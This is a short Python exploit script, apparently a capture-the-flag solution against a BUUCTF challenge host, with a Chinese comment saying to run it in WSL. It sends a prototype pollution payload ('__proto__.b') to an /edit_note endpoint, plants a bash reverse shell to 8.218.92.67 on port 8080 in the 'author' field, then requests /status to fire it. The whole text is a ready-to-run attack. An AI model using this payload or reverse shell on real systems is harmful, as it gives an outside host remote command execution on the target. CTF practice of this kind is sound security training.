# 在wsl中运行即可
import requests

url="http://3f9cde28-54c3-4507-9d88-724e570aee10.node5.buuoj.cn:81"

payload={
    "id":"__proto__.b",
    "author": "bash -i >& /dev/tcp/8.218.92.67/8080 0>&1",
    "raw" : "h3110 w0r1d"
}
print(payload)
r=requests.post(url+"/edit_note",json=payload,timeout=5)
print(r.text)
r=requests.get(url+"/status",timeout=5)
print(r.text)
